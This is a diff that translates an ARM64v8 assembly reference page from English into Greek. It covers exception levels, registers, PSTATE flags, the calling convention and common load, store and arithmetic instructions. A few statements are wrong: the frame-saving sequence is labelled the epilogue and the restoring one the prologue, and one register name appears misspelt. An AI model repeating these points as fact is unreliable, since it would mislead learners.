@@ -1,330 +1,323 @@
-# Introduction to ARM64v8
+# Εισαγωγή στο ARM64v8
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## **Exception Levels - EL (ARM64v8)**
+## **Επίπεδα Εξαίρεσης - EL (ARM64v8)**
 
-In ARMv8 architecture, execution levels, known as Exception Levels (ELs), define the privilege level and capabilities of the execution environment. There are four exception levels, ranging from EL0 to EL3, each serving a different purpose:
+Στην αρχιτεκτονική ARMv8, τα επίπεδα εκτέλεσης, γνωστά ως Επίπεδα Εξαίρεσης (ELs), καθορίζουν το επίπεδο προνομίων και τις δυνατότητες του περιβάλλοντος εκτέλεσης. Υπάρχουν τέσσερα επίπεδα εξαίρεσης, που κυμαίνονται από EL0 έως EL3, το καθένα εξυπηρετεί διαφορετικό σκοπό:
 
-1. **EL0 - User Mode**:
-   - This is the least-privileged level and is used for executing regular application code.
-   - Applications running at EL0 are isolated from each other and from the system software, enhancing security and stability.
-2. **EL1 - Operating System Kernel Mode**:
-   - Most operating system kernels run at this level.
-   - EL1 has more privileges than EL0 and can access system resources, but with some restrictions to ensure system integrity.
-3. **EL2 - Hypervisor Mode**:
-   - This level is used for virtualization. A hypervisor running at EL2 can manage multiple operating systems (each in its own EL1) running on the same physical hardware.
-   - EL2 provides features for isolation and control of the virtualized environments.
-4. **EL3 - Secure Monitor Mode**:
-   - This is the most privileged level and is often used for secure booting and trusted execution environments.
-   - EL3 can manage and control accesses between secure and non-secure states (such as secure boot, trusted OS, etc.).
+1. **EL0 - Λειτουργία Χρήστη**:
+- Αυτό είναι το λιγότερο προνομιακό επίπεδο και χρησιμοποιείται για την εκτέλεση κανονικού κώδικα εφαρμογής.
+- Οι εφαρμογές που εκτελούνται στο EL0 είναι απομονωμένες η μία από την άλλη και από το λογισμικό του συστήματος, ενισχύοντας την ασφάλεια και τη σταθερότητα.
+2. **EL1 - Λειτουργία Πυρήνα Λειτουργικού Συστήματος**:
+- Οι περισσότεροι πυρήνες λειτουργικών συστημάτων εκτελούνται σε αυτό το επίπεδο.
+- Το EL1 έχει περισσότερα προνόμια από το EL0 και μπορεί να έχει πρόσβαση σε πόρους του συστήματος, αλλά με ορισμένους περιορισμούς για να διασφαλιστεί η ακεραιότητα του συστήματος.
+3. **EL2 - Λειτουργία Υπερχειριστή**:
+- Αυτό το επίπεδο χρησιμοποιείται για εικονικοποίηση. Ένας υπερχειριστής που εκτελείται στο EL2 μπορεί να διαχειρίζεται πολλαπλά λειτουργικά συστήματα (το καθένα στο δικό του EL1) που εκτελούνται στο ίδιο φυσικό υλικό.
+- Το EL2 παρέχει δυνατότητες για απομόνωση και έλεγχο των εικονικών περιβαλλόντων.
+4. **EL3 - Λειτουργία Ασφαλούς Παρακολούθησης**:
+- Αυτό είναι το πιο προνομιακό επίπεδο και χρησιμοποιείται συχνά για ασφαλή εκκίνηση και αξιόπιστα περιβάλλοντα εκτέλεσης.
+- Το EL3 μπορεί να διαχειρίζεται και να ελέγχει τις προσβάσεις μεταξύ ασφαλών και μη ασφαλών καταστάσεων (όπως ασφαλής εκκίνηση, αξιόπιστο λειτουργικό σύστημα κ.λπ.).
 
-The use of these levels allows for a structured and secure way to manage different aspects of the system, from user applications to the most privileged system software. ARMv8's approach to privilege levels helps in effectively isolating different system components, thereby enhancing the security and robustness of the system.
+Η χρήση αυτών των επιπέδων επιτρέπει έναν δομημένο και ασφαλή τρόπο διαχείρισης διαφορετικών πτυχών του συστήματος, από τις εφαρμογές χρήστη έως το πιο προνομιακό λογισμικό του συστήματος. Η προσέγγιση του ARMv8 στα επίπεδα προνομίων βοηθά στην αποτελεσματική απομόνωση διαφορετικών στοιχείων του συστήματος, ενισχύοντας έτσι την ασφάλεια και την ανθεκτικότητα του συστήματος.
 
-## **Registers (ARM64v8)**
+## **Καταχωρητές (ARM64v8)**
 
-ARM64 has **31 general-purpose registers**, labeled `x0` through `x30`. Each can store a **64-bit** (8-byte) value. For operations that require only 32-bit values, the same registers can be accessed in a 32-bit mode using the names w0 through w30.
+Το ARM64 έχει **31 γενικούς καταχωρητές**, που φέρουν την ετικέτα `x0` έως `x30`. Κάθε ένας μπορεί να αποθηκεύσει μια **64-bit** (8-byte) τιμή. Για λειτουργίες που απαιτούν μόνο 32-bit τιμές, οι ίδιοι καταχωρητές μπορούν να προσπελαστούν σε 32-bit λειτουργία χρησιμοποιώντας τα ονόματα w0 έως w30.
 
-1. **`x0`** to **`x7`** - These are typically used as scratch registers and for passing parameters to subroutines.
-   - **`x0`** also carries the return data of a function
-2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction. **In macOS the x16 is the one used!**
-3. **`x9`** to **`x15`** - More temporary registers, often used for local variables.
-4. **`x16`** and **`x17`** - **Intra-procedural Call Registers**. Temporary registers for immediate values. They are also used for indirect function calls and PLT (Procedure Linkage Table) stubs.
-   - **`x16`** is used as the **system call number** for the **`svc`** instruction in **macOS**.
-5. **`x18`** - **Platform register**. It can be used as a general-purpose register, but on some platforms, this register is reserved for platform-specific uses: Pointer to current thread environment block in Windows, or to point to the currently **executing task structure in linux kernel**.
-6. **`x19`** to **`x28`** - These are callee-saved registers. A function must preserve these registers' values for its caller, so they are stored in the stack and recovered before going back to the caller.
-7. **`x29`** - **Frame pointer** to keep track of the stack frame. When a new stack frame is created because a function is called, the **`x29`** register is **stored in the stack** and the **new** frame pointer address is (**`sp`** address) is **stored in this registry**.
-   - This register can also be used as a **general-purpose registry** although it's usually used as reference to **local variables**.
-8. **`x30`** or **`lr`**- **Link register** . It holds the **return address** when a `BL` (Branch with Link) or `BLR` (Branch with Link to Register) instruction is executed by storing the **`pc`** value in this register.
-   - It could also be used like any other register.
-   - If the current function is going to call a new function and therefore overwrite `lr`, it will store it in the stack at the beginning, this is the epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) and recover it at the end, this is the prologue (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
-9. **`sp`** - **Stack pointer**, used to keep track of the top of the stack.
-   - the **`sp`** value should always be kept to at least a **quadword** **alignment** or a alignment exception may occur.
-10. **`pc`** - **Program counter**, which points to the next instruction. This register can only be updates through exception generations, exception returns, and branches. The only ordinary instructions that can read this register are branch with link instructions (BL, BLR) to store the **`pc`** address in **`lr`** (Link Register).
-11. **`xzr`** - **Zero register**. Also called **`wzr`** in it **32**-bit register form. Can be used to get the zero value easily (common operation) or to perform comparisons using **`subs`** like **`subs XZR, Xn, #10`** storing the resulting data nowhere (in **`xzr`**).
+1. **`x0`** έως **`x7`** - Αυτοί χρησιμοποιούνται συνήθως ως καταχωρητές scratch και για τη μεταφορά παραμέτρων σε υπορουτίνες.
+- **`x0`** μεταφέρει επίσης τα δεδομένα επιστροφής μιας συνάρτησης
+2. **`x8`** - Στον πυρήνα Linux, το `x8` χρησιμοποιείται ως αριθμός κλήσης συστήματος για την εντολή `svc`. **Στο macOS, το x16 είναι αυτό που χρησιμοποιείται!**
+3. **`x9`** έως **`x15`** - Περισσότεροι προσωρινοί καταχωρητές, συχνά χρησιμοποιούμενοι για τοπικές μεταβλητές.
+4. **`x16`** και **`x17`** - **Καταχωρητές Ενδο-διαδικαστικής Κλήσης**. Προσωρινοί καταχωρητές για άμεσες τιμές. Χρησιμοποιούνται επίσης για έμμεσες κλήσεις συναρτήσεων και PLT (Πίνακας Σύνδεσης Διαδικασίας).
+- **`x16`** χρησιμοποιείται ως **αριθμός κλήσης συστήματος** για την εντολή **`svc`** στο **macOS**.
+5. **`x18`** - **Καταχωρητής πλατφόρμας**. Μπορεί να χρησιμοποιηθεί ως γενικός καταχωρητής, αλλά σε ορισμένες πλατφόρμες, αυτός ο καταχωρητής είναι δεσμευμένος για συγκεκριμένες χρήσεις πλατφόρμας: Δείκτης στο τρέχον περιβάλλον νήματος στη Windows, ή για να δείχνει στη δομή τρέχουσας **εκτελούμενης εργασίας στον πυρήνα linux**.
+6. **`x19`** έως **`x28`** - Αυτοί είναι καταχωρητές που διατηρούνται από τον καλούμενο. Μια συνάρτηση πρέπει να διατηρεί τις τιμές αυτών των καταχωρητών για τον καλούντα, οπότε αποθηκεύονται στο στοίβα και ανακτώνται πριν επιστρέψουν στον καλούντα.
+7. **`x29`** - **Δείκτης πλαισίου** για την παρακολούθηση του πλαισίου στοίβας. Όταν δημιουργείται ένα νέο πλαίσιο στοίβας επειδή καλείται μια συνάρτηση, ο καταχωρητής **`x29`** **αποθηκεύεται στο στοίβα** και η διεύθυνση του **νέου** δείκτη πλαισίου (**διεύθυνση `sp`**) **αποθηκεύεται σε αυτόν τον καταχωρητή**.
+- Αυτός ο καταχωρητής μπορεί επίσης να χρησιμοποιηθεί ως **γενικός καταχωρητής** αν και συνήθως χρησιμοποιείται ως αναφορά σε **τοπικές μεταβλητές**.
+8. **`x30`** ή **`lr`**- **Καταχωρητής σύνδεσης**. Διατηρεί τη **διεύθυνση επιστροφής** όταν εκτελείται μια εντολή `BL` (Branch with Link) ή `BLR` (Branch with Link to Register) αποθηκεύοντας την τιμή **`pc`** σε αυτόν τον καταχωρητή.
+- Μπορεί επίσης να χρησιμοποιηθεί όπως οποιοσδήποτε άλλος καταχωρητής.
+- Εάν η τρέχουσα συνάρτηση πρόκειται να καλέσει μια νέα συνάρτηση και επομένως να επαναγράψει το `lr`, θα το αποθηκεύσει στο στοίβα στην αρχή, αυτό είναι το επιλόγιο (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Αποθήκευση `fp` και `lr`, δημιουργία χώρου και λήψη νέου `fp`) και θα το ανακτήσει στο τέλος, αυτό είναι το πρόλογο (`ldp x29, x30, [sp], #48; ret` -> Ανάκτηση `fp` και `lr` και επιστροφή).
+9. **`sp`** - **Δείκτης στοίβας**, χρησιμοποιείται για την παρακολούθηση της κορυφής της στοίβας.
+- Η τιμή **`sp`** θα πρέπει πάντα να διατηρείται τουλάχιστον σε **ευθυγράμμιση quadword** ή μπορεί να προκύψει εξαίρεση ευθυγράμμισης.
+10. **`pc`** - **Μετρητής προγράμματος**, που δείχνει στην επόμενη εντολή. Αυτός ο καταχωρητής μπορεί να ενημερωθεί μόνο μέσω γενεών εξαιρέσεων, επιστροφών εξαιρέσεων και κλάδων. Οι μόνοι κανονικοί εντολές που μπορούν να διαβάσουν αυτόν τον καταχωρητή είναι οι εντολές κλάδου με σύνδεση (BL, BLR) για να αποθηκεύσουν τη διεύθυνση **`pc`** στο **`lr`** (Καταχωρητής Σύνδεσης).
+11. **`xzr`** - **Καταχωρητής μηδέν**. Ονομάζεται επίσης **`wzr`** στην **32**-bit μορφή του. Μπορεί να χρησιμοποιηθεί για να αποκτήσει εύκολα την τιμή μηδέν (συνηθισμένη λειτουργία) ή για να εκτελέσει συγκρίσεις χρησιμοποιώντας **`subs`** όπως **`subs XZR, Xn, #10`** αποθηκεύοντας τα αποτελέσματα που προκύπτουν πουθενά (στο **`xzr`**).
 
-The **`Wn`** registers are the **32bit** version of the **`Xn`** register.
+Οι καταχωρητές **`Wn`** είναι η **32bit** έκδοση του καταχωρητή **`Xn`**.
 
-### SIMD and Floating-Point Registers
+### SIMD και Καταχωρητές Κινητής Τελείας
 
-Moreover, there are another **32 registers of 128bit length** that can be used in optimized single instruction multiple data (SIMD) operations and for performing floating-point arithmetic. These are called the Vn registers although they can also operate in **64**-bit, **32**-bit, **16**-bit and **8**-bit and then they are called **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** and **`Bn`**.
+Επιπλέον, υπάρχουν άλλοι **32 καταχωρητές μήκους 128bit** που μπορούν να χρησιμοποιηθούν σε βελτιστοποιημένες λειτουργίες πολλαπλών δεδομένων με μία εντολή (SIMD) και για την εκτέλεση αριθμητικών υπολογισμών κινητής υποδιαστολής. Αυτοί ονομάζονται καταχωρητές Vn αν και μπορούν επίσης να λειτουργούν σε **64**-bit, **32**-bit, **16**-bit και **8**-bit και τότε ονομάζονται **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** και **`Bn`**.
 
-### System Registers
+### Καταχωρητές Συστήματος
 
-**There are hundreds of system registers**, also called special-purpose registers (SPRs), are used for **monitoring** and **controlling** **processors** behaviour.\
-They can only be read or set using the dedicated special instruction **`mrs`** and **`msr`**.
+**Υπάρχουν εκατοντάδες καταχωρητές συστήματος**, που ονομάζονται επίσης καταχωρητές ειδικού σκοπού (SPRs), που χρησιμοποιούνται για **παρακολούθηση** και **έλεγχο** της συμπεριφοράς των **επεξεργαστών**.\
+Μπορούν να διαβαστούν ή να ρυθμιστούν μόνο χρησιμοποιώντας τις ειδικές εντολές **`mrs`** και **`msr`**.
 
-The special registers **`TPIDR_EL0`** and **`TPIDDR_EL0`** are commonly found when reversing engineering. The `EL0` suffix indicates the **minimal exception** from which the register can be accessed (in this case EL0 is the regular exception (privilege) level regular programs runs with).\
-They are often used to store the **base address of the thread-local storage** region of memory. Usually the first one is readable and writable for programs running in EL0, but the second can be read from EL0 and written from EL1 (like kernel).
+Οι ειδικοί καταχωρητές **`TPIDR_EL0`** και **`TPIDDR_EL0`** βρίσκονται συχνά κατά την αντίστροφη μηχανική. Το επίθημα `EL0` υποδηλώνει την **ελάχιστη εξαίρεση** από την οποία μπορεί να προσπελαστεί ο καταχωρητής (σε αυτή την περίπτωση το EL0 είναι το κανονικό επίπεδο εξαίρεσης (προνομίων) με το οποίο εκτελούνται τα κανονικά προγράμματα).\
+Συνήθως χρησιμοποιούνται για να αποθηκεύσουν τη **βάση διεύθυνση της περιοχής αποθήκευσης τοπικών νημάτων** μνήμης. Συνήθως ο πρώτος είναι αναγνώσιμος και εγγράψιμος για προγράμματα που εκτελούνται στο EL0, αλλά ο δεύτερος μπορεί να διαβαστεί από το EL0 και να γραφεί από το EL1 (όπως ο πυρήνας).
 
-- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
-- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`
+- `mrs x0, TPIDR_EL0 ; Διαβάστε το TPIDR_EL0 στο x0`
+- `msr TPIDR_EL0, X0 ; Γράψτε το x0 στο TPIDR_EL0`
 
 ### **PSTATE**
 
-**PSTATE** contains several process components serialized into the operating-system-visible **`SPSR_ELx`** special register, being X the **permission** **level of the triggered** exception (this allows to recover the process state when the exception ends).\
-These are the accessible fields:
+**PSTATE** περιέχει αρκετά στοιχεία διαδικασίας σειριακά στο ορατό από το λειτουργικό σύστημα **`SPSR_ELx`** ειδικό καταχωρητή, όπου το X είναι το **επίπεδο άδειας** της ενεργοποιημένης εξαίρεσης (αυτό επιτρέπει την ανάκτηση της κατάστασης της διαδικασίας όταν τελειώνει η εξαίρεση).\
+Αυτά είναι τα προσβάσιμα πεδία:
 
 <figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>
 
-- The **`N`**, **`Z`**, **`C`** and **`V`** condition flags:
-  - **`N`** means the operation yielded a negative result
-  - **`Z`** means the operation yielded zero
-  - **`C`** means the operation carried
-  - **`V`** means the operation yielded a signed overflow:
-    - The sum of two positive numbers yields a negative result.
-    - The sum of two negative numbers yields a positive result.
-    - In subtraction, when a large negative number is subtracted from a smaller positive number (or vice versa), and the result cannot be represented within the range of the given bit size.
-    - Obviously the processor doesn't now the operation is signed or not, so it will check C and V in the operations and indicate of a carry occurred in case it was signed or unsigned.
+- Οι σημαίες συνθηκών **`N`**, **`Z`**, **`C`** και **`V`**:
+- **`N`** σημαίνει ότι η λειτουργία απέδωσε αρνητικό αποτέλεσμα
+- **`Z`** σημαίνει ότι η λειτουργία απέδωσε μηδέν
+- **`C`** σημαίνει ότι η λειτουργία είχε μεταφορά
+- **`V`** σημαίνει ότι η λειτουργία απέδωσε υπερχείλιση υπογραφής:
+- Το άθροισμα δύο θετικών αριθμών αποδίδει αρνητικό αποτέλεσμα.
+- Το άθροισμα δύο αρνητικών αριθμών αποδίδει θετικό αποτέλεσμα.
+- Στην αφαίρεση, όταν αφαιρείται ένας μεγάλος αρνητικός αριθμός από έναν μικρό θετικό αριθμό (ή το αντίστροφο), και το αποτέλεσμα δεν μπορεί να αναπαρασταθεί εντός του εύρους του δεδομένου μεγέθους bit.
+- Προφανώς, ο επεξεργαστής δεν γνωρίζει αν η λειτουργία είναι υπογεγραμμένη ή όχι, οπότε θα ελέγξει το C και το V στις λειτουργίες και θα υποδείξει αν συνέβη μεταφορά σε περίπτωση που ήταν υπογεγραμμένη ή μη υπογεγραμμένη.
 
 > [!WARNING]
-> Not all the instructions update these flags. Some like **`CMP`** or **`TST`** do, and others that have an s suffix like **`ADDS`** also do it.
+> Όχι όλες οι εντολές ενημερώνουν αυτές τις σημαίες. Ορισμένες όπως **`CMP`** ή **`TST`** το κάνουν, και άλλες που έχουν ένα s επίθημα όπως **`ADDS`** το κάνουν επίσης.
 
-- The current **register width (`nRW`) flag**: If the flag holds the value 0, the program will run in the AArch64 execution state once resumed.
-- The current **Exception Level** (**`EL`**): A regular program running in EL0 will have the value 0
-- The **single stepping** flag (**`SS`**): Used by debuggers to single step by setting the SS flag to 1 inside **`SPSR_ELx`** through an exception. The program will run a step and issue a single step exception.
-- The **illegal exception** state flag (**`IL`**): It's used to mark when a privileged software performs an invalid exception level transfer, this flag is set to 1 and the processor triggers an illegal state exception.
-- The **`DAIF`** flags: These flags allow a privileged program to selectively mask certain external exceptions.
-  - If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).
-- The **stack pointer select** flags (**`SPS`**): Privileged programs running in EL1 and above can swap between using their own stack pointer register and the user-model one (e.g. between `SP_EL1` and `EL0`). This switching is performed by writing to the **`SPSel`** special register. This cannot be done from EL0.
+- Η τρέχουσα σημαία **πλάτους καταχωρητή (`nRW`)**: Εάν η σημαία έχει την τιμή 0, το πρόγραμμα θα εκτελείται στην κατάσταση εκτέλεσης AArch64 μόλις επανεκκινηθεί.
+- Το τρέχον **Επίπεδο Εξαίρεσης** (**`EL`**): Ένα κανονικό πρόγραμμα που εκτελείται στο EL0 θα έχει την τιμή 0
+- Η σημαία **μοναδικού βήματος** (**`SS`**): Χρησιμοποιείται από αποσφαλματωτές για να εκτελούν μοναδικά βήματα ρυθμίζοντας τη σημαία SS σε 1 μέσα από το **`SPSR_ELx`** μέσω μιας εξαίρεσης. Το πρόγραμμα θα εκτελεί ένα βήμα και θα εκδώσει μια εξαίρεση μοναδικού βήματος.
+- Η σημαία **κατάστασης παράνομης εξαίρεσης** (**`IL`**): Χρησιμοποιείται για να σημάνει πότε ένα προνομιακό λογισμικό εκτελεί μια μη έγκυρη μεταφορά επιπέδου εξαίρεσης, αυτή η σημαία ρυθμίζεται σε 1 και ο επεξεργαστής ενεργοποιεί μια εξαίρεση παράνομης κατάστασης.
+- Οι σημαίες **`DAIF`**: Αυτές οι σημαίες επιτρέπουν σε ένα προνομιακό πρόγραμμα να επιλέξει να αποκλείσει ορισμένες εξωτερικές εξαιρέσεις.
+- Εάν **`A`** είναι 1 σημαίνει ότι θα ενεργοποιηθούν **ασύγχρονοι τερματισμοί**. Η **`I`** ρυθμίζει την αντίδραση σε εξωτερικά αιτήματα διακοπής (IRQs). και το F σχετίζεται με **Γρήγορα Αιτήματα Διακοπής** (FIRs).
+- Οι σημαίες επιλογής δείκτη στοίβας (**`SPS`**): Προνομιακά προγράμματα που εκτελούνται στο EL1 και άνω μπορούν να εναλλάσσουν τη χρήση του δικού τους καταχωρητή δείκτη στοίβας και του καταχωρητή μοντέλου χρήστη (π.χ. μεταξύ `SP_EL1` και `EL0`). Αυτή η εναλλαγή πραγματοποιείται γράφοντας στον ειδικό καταχωρητή **`SPSel`**. Αυτό δεν μπορεί να γίνει από το EL0.
 
-## **Calling Convention (ARM64v8)**
+## **Σύμβαση Κλήσης (ARM64v8)**
 
-The ARM64 calling convention specifies that the **first eight parameters** to a function are passed in registers **`x0` through `x7`**. **Additional** parameters are passed on the **stack**. The **return** value is passed back in register **`x0`**, or in **`x1`** as well **if its 128 bits long**. The **`x19`** to **`x30`** and **`sp`** registers must be **preserved** across function calls.
+Η σύμβαση κλήσης ARM64 καθορίζει ότι οι **πρώτες οκτώ παράμετροι** σε μια συνάρτηση μεταφέρονται σε καταχωρητές **`x0` έως `x7`**. **Επιπλέον** παράμετροι μεταφέρονται στο **στοίβα**. Η **τιμή επιστροφής** μεταφέρεται πίσω στον καταχωρητή **`x0`**, ή στο **`x1`** επίσης **αν είναι 128 bits**. Οι καταχωρητές **`x19`** έως **`x30`** και **`sp`** πρέπει να **διατηρούνται** κατά τις κλήσεις συναρτήσεων.
 
-When reading a function in assembly, look for the **function prologue and epilogue**. The **prologue** usually involves **saving the frame pointer (`x29`)**, **setting** up a **new frame pointer**, and a**llocating stack space**. The **epilogue** usually involves **restoring the saved frame pointer** and **returning** from the function.
+Όταν διαβάζετε μια συνάρτηση σε assembly, αναζητήστε τον **πρόλογο και το επιλόγιο** της συνάρτησης. Ο **πρόλογος** συνήθως περιλαμβάνει **αποθήκευση του δείκτη πλαισίου (`x29`)**, **ρύθμιση** ενός **νέου δείκτη πλαισίου**, και **κατανομή χώρου στοίβας**. Το **επιλόγιο** συνήθως περιλαμβάνει **αποκατάσταση του αποθηκευμένου δείκτη πλαισίου** και **επιστροφή** από τη συνάρτηση.
 
-### Calling Convention in Swift
+### Σύμβαση Κλήσης στη Swift
 
-Swift have its own **calling convention** that can be found in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
+Η Swift έχει τη δική της **σύμβαση κλήσης** που μπορεί να βρεθεί στο [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
 
-## **Common Instructions (ARM64v8)**
+## **Κοινές Εντολές (ARM64v8)**
 
-ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where **`opcode`** is the **operation** to be performed (such as `add`, `sub`, `mov`, etc.), **`dst`** is the **destination** register where the result will be stored, and **`src1`** and **`src2`** are the **source** registers. Immediate values can also be used in place of source registers.
+Οι εντολές ARM64 γενικά έχουν τη **μορφή `opcode dst, src1, src2`**, όπου **`opcode`** είναι η **λειτουργία** που θα εκτελεστεί (όπως `add`, `sub`, `mov`, κ.λπ.), **`dst`** είναι ο **καταχωρητής προορισμού** όπου θα αποθηκευτεί το αποτέλεσμα, και **`src1`** και **`src2`** είναι οι **καταχωρητές πηγής**. Άμεσες τιμές μπορούν επίσης να χρησιμοποιηθούν αντί για καταχωρητές πηγής.
 
-- **`mov`**: **Move** a value from one **register** to another.
-  - Example: `mov x0, x1` — This moves the value from `x1` to `x0`.
-- **`ldr`**: **Load** a value from **memory** into a **register**.
-  - Example: `ldr x0, [x1]` — This loads a value from the memory location pointed to by `x1` into `x0`.
-  - **Offset mode**: An offset affecting the orin pointer is indicated, for example:
-    - `ldr x2, [x1, #8]`, this will load in x2 the value from x1 + 8
-    - `ldr x2, [x0, x1, lsl #2]`, this will load in x2 an object from the array x0, from the position x1 (index) \* 4
-  - **Pre-indexed mode**: This will apply calculations to the origin, get the result and also store the new origin in the origin.
-    - `ldr x2, [x1, #8]!`, this will load `x1 + 8` in `x2` and store in x1 the result of `x1 + 8`
-    - `str lr, [sp, #-4]!`, Store the link register in sp and update the register sp
-  - **Post-index mode**: This is like the previous one but the memory address is accessed and then the offset is calculated and stored.
-    - `ldr x0, [x1], #8`, load `x1` in `x0` and update x1 with `x1 + 8`
-  - **PC-relative addressing**: In this case the address to load is calculated relative to the PC register
-    - `ldr x1, =_start`, This will load the address where the `_start` symbol starts in x1 related to the current PC.
-- **`str`**: **Store** a value from a **register** into **memory**.
-  - Example: `str x0, [x1]` — This stores the value in `x0` into the memory location pointed to by `x1`.
-- **`ldp`**: **Load Pair of Registers**. This instruction **loads two registers** from **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
-  - Example: `ldp x0, x1, [x2]` — This loads `x0` and `x1` from the memory locations at `x2` and `x2 + 8`, respectively.
-- **`stp`**: **Store Pair of Registers**. This instruction **stores two registers** to **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
-  - Example: `stp x0, x1, [sp]` — This stores `x0` and `x1` to the memory locations at `sp` and `sp + 8`, respectively.
-  - `stp x0, x1, [sp, #16]!` — This stores `x0` and `x1` to the memory locations at `sp+16` and `sp + 24`, respectively, and updates `sp` with `sp+16`.
-- **`add`**: **Add** the values of two registers and store the result in a register.
-  - Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
-    - Xn1 -> Destination
-    - Xn2 -> Operand 1
-    - Xn3 | #imm -> Operando 2 (register or immediate)
-    - \[shift #N | RRX] -> Perform a shift or call RRX
-  - Example: `add x0, x1, x2` — This adds the values in `x1` and `x2` together and stores the result in `x0`.
-  - `add x5, x5, #1, lsl #12` — This equals to 4096 (a 1 shifter 12 times) -> 1 0000 0000 0000 0000
-  - **`adds`** This perform an `add` and updates the flags
-- **`sub`**: **Subtract** the values of two registers and store the result in a register.
-  - Check **`add`** **syntax**.
-  - Example: `sub x0, x1, x2` — This subtracts the value in `x2` from `x1` and stores the result in `x0`.
-  - **`subs`** This is like sub but updating the flag
-- **`mul`**: **Multiply** the values of **two registers** and store the result in a register.
-  - Example: `mul x0, x1, x2` — This multiplies the values in `x1` and `x2` and stores the result in `x0`.
-- **`div`**: **Divide** the value of one register by another and store the result in a register.
-  - Example: `div x0, x1, x2` — This divides the value in `x1` by `x2` and stores the result in `x0`.
+- **`mov`**: **Μετακίνηση** μιας τιμής από έναν **καταχωρητή** σε έναν άλλο.
+- Παράδειγμα: `mov x0, x1` — Αυτό μετακινεί την τιμή από `x1` στο `x0`.
+- **`ldr`**: **Φόρτωση** μιας τιμής από **μνήμη** σε έναν **καταχωρητή**.
+- Παράδειγμα: `ldr x0, [x1]` — Αυτό φορτώνει μια τιμή από τη διεύθυνση μνήμης που υποδεικνύεται από το `x1` στο `x0`.
+- **Λειτουργία Offset**: Ένα offset που επηρεάζει τον αρχικό δείκτη υποδεικνύεται, για παράδειγμα:
+- `ldr x2, [x1, #8]`, αυτό θα φορτώσει στο x2 την τιμή από x1 + 8
+- `ldr x2, [x0, x1, lsl #2]`, αυτό θα φορτώσει στο x2 ένα αντικείμενο από τον πίνακα x0, από τη θέση x1 (δείκτης) \* 4
+- **Προκαθορισμένη Λειτουργία**: Αυτό θα εφαρμόσει υπολογισμούς στον αρχικό δείκτη, θα πάρει το αποτέλεσμα και θα αποθηκεύσει επίσης τον νέο αρχικό δείκτη στον αρχικό δείκτη.
+- `ldr x2, [x1, #8]!`, αυτό θα φορτώσει το `x1 + 8` στο `x2` και θα αποθηκεύσει στο x1 το αποτέλεσμα του `x1 + 8`
+- `str lr, [sp, #-4]!`, Αποθήκευση του καταχωρητή σύνδεσης στο sp και ενημέρωση του καταχωρητή sp
+- **Μετά την Καταχώρηση**: Αυτό είναι όπως η προηγούμενη αλλά η διεύθυνση μνήμης προσπελάζεται και στη συνέχεια υπολογίζεται και αποθηκεύεται το offset.
+- `ldr x0, [x1], #8`, φορτώστε το `x1` στο `x0` και ενημερώστε το x1 με `x1 + 8`
+- **Διεύθυνση Σχετική με το PC**: Σε αυτή την περίπτωση, η διεύθυνση που θα φορτωθεί υπολογίζεται σχετική με τον καταχωρητή PC
+- `ldr x1, =_start`, Αυτό θα φορτώσει τη διεύθυνση όπου ξεκινά το σύμβολο `_start` στο x1 σχετική με το τρέχον PC.
+- **`str`**: **Αποθήκευση** μιας τιμής από έναν **καταχωρητή** σε **μνήμη**.
+- Παράδειγμα: `str x0, [x1]` — Αυτό αποθηκεύει την τιμή στο `x0` στη διεύθυνση μνήμης που υποδεικνύεται από το `x1`.
+- **`ldp`**: **Φόρτωση Ζεύγους Καταχωρητών**. Αυτή η εντολή **φορτώνει δύο καταχωρητές** από **διαδοχικές μνήμες**. Η διεύθυνση μνήμης σχηματίζεται συνήθως προσθέτοντας ένα offset στην τιμή ενός άλλου καταχωρητή.
+- Παράδειγμα: `ldp x0, x1, [x2]` — Αυτό φορτώνει το `x0` και το `x1` από τις διευθύνσεις μνήμης στο `x2` και `x2 + 8`, αντίστοιχα.
+- **`stp`**: **Αποθήκευση Ζεύγους Καταχωρητών**. Αυτή η εντολή **αποθηκεύει δύο καταχωρητές** σε **διαδοχικές μνήμες**. Η διεύθυνση μνήμης σχηματίζεται συνήθως προσθέτοντας ένα offset στην τιμή ενός άλλου καταχωρητή.
+- Παράδειγμα: `stp x0, x1, [sp]` — Αυτό αποθηκεύει το `x0` και το `x1` στις διευθύνσεις μνήμης στο `sp` και `sp + 8`, αντίστοιχα.
+- `stp x0, x1, [sp, #16]!` — Αυτό αποθηκεύει το `x0` και το `x1` στις διευθύνσεις μνήμης στο `sp+16` και `sp + 24`, αντίστοιχα, και ενημερώνει το `sp` με `sp+16`.
+- **`add`**: **Προσθέστε** τις τιμές δύο καταχωρητών και αποθηκεύστε το αποτέλεσμα σε έναν καταχωρητή.
+- Σύνταξη: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
+- Xn1 -> Προορισμός
+- Xn2 -> Λειτουργία 1
+- Xn3 | #imm -> Λειτουργία 2 (καταχωρητής ή άμεσο)
+- \[shift #N | RRX] -> Εκτελέστε μια μετατόπιση ή καλέστε RRX
+- Παράδειγμα: `add x0, x1, x2` — Αυτό προσθέτει τις τιμές στο `x1` και `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
